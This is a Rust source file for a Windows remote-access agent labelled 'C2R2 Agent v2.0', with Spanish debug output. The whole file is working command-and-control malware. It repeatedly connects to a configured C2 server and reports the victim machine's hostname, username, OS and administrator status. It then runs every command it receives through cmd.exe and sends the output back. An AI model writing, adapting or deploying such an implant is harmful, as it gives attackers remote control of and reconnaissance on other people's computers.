#![windows_subsystem = "console"]

mod config;

use std::io::{BufRead, BufReader, Write};
use std::net::TcpStream;
use std::process::Command;
use std::thread;
use std::time::Duration;

const DELIMITER: &str = "\n<<END>>\n";

fn main() {
    println!("DEBUG: C2R2 Agent v2.0 - Direct Connection");
    println!("DEBUG: Conectando a {}", config::C2_SERVER);
    
    loop {
        match TcpStream::connect(config::C2_SERVER) {
            Ok(stream) => {
                println!("DEBUG: Conectado al servidor C2");
                handle_connection(stream);
                println!("DEBUG: Conexión cerrada, reintentando en 10s...");
            }
            Err(e) => {
                println!("DEBUG: Error de conexión: {}, reintentando en 10s...", e);
            }
        }
        thread::sleep(Duration::from_secs(10));
    }
}

fn handle_connection(stream: TcpStream) {
    let mut reader = BufReader::new(stream.try_clone().unwrap());
    let mut writer = stream;

    let stream_clone = writer.try_clone().unwrap();
    thread::spawn(move || {
        send_sysinfo(stream_clone);
    });

    let mut buffer = String::new();
    loop {
        match reader.read_line(&mut buffer) {
            Ok(0) => break,
            Ok(_) => {
                let command = buffer.trim();
                println!("DEBUG: Comando recibido: {}", command);

                if command == "ping" {
                    writer.write_all(b"pong\n").ok();
                    writer.flush().ok();
                } else if !command.is_empty() {
                    let output = execute_command(command);
                    let response = format!("{}{}", output, DELIMITER);
                    writer.write_all(response.as_bytes()).ok();
                    writer.flush().ok();
                }
                buffer.clear();
            }
            Err(_) => break,
        }
    }
}

fn send_sysinfo(mut stream: TcpStream) {
    let info_types = ["hostname", "username", "os", "privileges"];
    for info_type in &info_types {
        let value = get_system_info(info_type);
        let message = format!("__SYSINFO__:{}:{}\n", info_type, value);
        stream.write_all(message.as_bytes()).ok();
        stream.flush().ok();
        thread::sleep(Duration::from_secs(10));
    }
}

fn get_system_info(info_type: &str) -> String {
    let output = match info_type {
        "hostname" => Command::new("hostname").output(),
        "username" => Command::new("cmd").args(&["/C", "echo %USERNAME%"]).output(),
        "os" => Command::new("cmd").args(&["/C", "ver"]).output(),
        "privileges" => Command::new("cmd")
            .args(&["/C", "net session >nul 2>&1 && echo Admin || echo User"])
            .output(),
        _ => return String::new(),
    };

    match output {
        Ok(out) => String::from_utf8_lossy(&out.stdout).trim().to_string(),
        Err(_) => "Unknown".to_string(),
    }
}

fn execute_command(command: &str) -> String {
    println!("DEBUG: Ejecutando comando: {}", command);
    let output = Command::new("cmd").args(&["/C", command]).output();
    match output {
        Ok(out) => {
            let stdout = String::from_utf8_lossy(&out.stdout);
            let stderr = String::from_utf8_lossy(&out.stderr);
            format!("{}{}", stdout, stderr)
        }
        Err(e) => format!("Error: {}", e),
    }
}
